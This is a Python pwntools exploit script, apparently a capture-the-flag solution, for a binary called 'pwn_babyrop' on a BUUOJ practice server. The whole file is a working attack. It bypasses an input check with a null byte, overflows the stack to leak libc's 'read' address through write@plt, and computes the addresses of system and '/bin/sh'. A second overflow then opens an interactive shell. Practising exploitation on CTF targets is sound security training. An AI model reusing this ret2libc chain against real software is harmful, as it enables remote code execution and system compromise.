from pwn import *
from time import *
context.binary = './pwn_babyrop'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

write_plt = elf.plt['write']
read_got = elf.got['read']
main = 0x08048825

def dbg():
	raw_input()

if args['REMOTE']:
	p = remote('node1.buuoj.cn', 28101)
	libc = ELF('../x86_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./pwn_babyrop')

#gdb.attach(p, 'b* 0x080487FD ')
payload1 = '\x00' + 'a'*6 + '\x80'
payload1 = payload1.ljust(0x20, 'a')
p.send(payload1)

p.recvline('Correct\n')
payload2 = 'a'*(0xe7 + 0x4)
payload2 += p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)
p.send(payload2)

read_addr = u32(p.recv(4))
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))

p.send(payload1)
p.recvline('Correct\n')

payload3 = 'a'*(0xe7 + 0x4)
payload3 += p32(system_addr) + p32(main) + p32(binsh)
p.send(payload3)

p.interactive()
p.close()